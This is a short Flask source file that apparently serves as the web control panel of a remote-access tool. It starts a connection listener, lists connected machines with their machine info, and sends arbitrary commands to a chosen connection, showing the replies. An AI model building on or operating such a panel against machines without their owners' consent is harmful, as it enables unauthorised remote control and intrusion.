from flask import Flask
from flask import request, make_response, render_template

import connection_manager

import threading
import time

app = Flask(__name__)
manager_thread = None
@app.route("/init", methods=["POST"])
def init():
    if request.method == "POST":
        ip = request.form.get("ip")
        port = int(request.form.get("port"))
        django_server = request.form.get("django-server")
        manager_thread = threading.Thread(target=connection_manager.run_manager, args=(ip, port, django_server),daemon=True)
        manager_thread.start()
        manager_thread.join()
        return make_response(render_template("init.html"), 200)
        

        

@app.route("/all_conn", methods=["GET"])
def get_conn():
    data = []
    for conn in connection_manager.ACTIVE_CONNECTIONS:
        temp = str(conn.addr[0])+str(conn.machine_info)
        temp.replace('\n','<br>')
        data.append(temp)
    return render_template("data.html", data=data)

@app.route("/exec_conn", methods=["POST"])
def exec_conn():
    if request.method == "POST":
        connection_id = int(request.form.get("id"))
        command = request.form.get("command")

        response = connection_manager.execute_command(id=connection_id, command=command)
        """        
        execute_command_thread = threading.Thread(target=connection_manager.execute_command, args=(connection_id, command))
        execute_command_thread.start()
        execute_command_thread.join()

        response = connection_manager.RESPONSE_DIRECTORY[connection_id]
        """
        return make_response(render_template("data.html", data=response), 200)




def run_flask():
    app.run(debug=True, use_reloader=False,host="127.0.0.1", port=5000)

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    flask_thread.join()